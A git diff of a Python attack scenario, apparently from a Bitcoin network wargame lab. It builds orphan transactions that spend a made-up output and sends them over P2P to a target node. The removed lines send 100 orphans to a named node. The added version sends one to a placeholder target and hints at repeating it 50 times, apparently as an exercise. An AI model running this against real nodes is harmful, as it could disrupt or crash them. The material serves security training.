@@ -61,10 +61,8 @@ class Orphan50(Commander):
             pass
 
         # We pick a node on the network to attack
-        # We know this one is vulnderable to 50 orphans based on it's subver
-        # Change this to your teams colour if running in the battleground
-        # victim = "TARGET_TANK_NAME.default.svc"
-        victim = "tank-0002-red.default.svc"
+        # Find the node that is vulnerable to 50 orphans on fork-observer
+        victim = "TARGET_TANK_NAME.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -87,40 +85,32 @@ class Orphan50(Commander):
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
-        for i in range(100):
-            # make a transaction that spends an output that doesn't exist
-            tx = CTransaction()
+        # make a transaction that spends an output that doesn't exist
+        tx = CTransaction()
 
-            # tx.vin.append(
-            #     CTxIn(COutPoint(first_tx.sha256, 0), scriptSig=CScript([script]))
-            # )
-            tx.vin.append(
-                CTxIn(
-                    COutPoint(
-                        int(
-                            "e3bb40caa4d604219a7394fdc8c72f1002b31b17ddcb01ddda3ccc8a20a0c183",
-                            16,
-                        ),
-                        0,
+        tx.vin.append(
+            CTxIn(
+                COutPoint(
+                    int(
+                        # random made up input
+                        "e3bb40caa4d604219a7394fdc8c72f1002b31b17ddcb01ddda3ccc8a20a0c183",
+                        16,
                     ),
-                    CScript([OP_TRUE]),
-                    SEQUENCE_FINAL,
-                )
+                    0,
+                ),
             )
-            tx.vout.append(
-                CTxOut(
-                    int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress())
-                )
-            )
+        )
+        tx.vout.append(
+            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
+        )
 
-            tx.calc_sha256()
+        tx.calc_sha256()
 
-            print(tx.serialize().hex())
+        print(tx.serialize().hex())
 
-            # send the orphan, perhaps like this:
-            attacker.send_and_ping(msg_tx(tx))
+        attacker.send_and_ping(msg_tx(tx))
 
-            self.log.info(f"Sent orphan {i+1} of 100")
+        # NOW perhhaps we could do this 50 times to the node that is vulnerable to 50 orphans??
 
 
 def main():
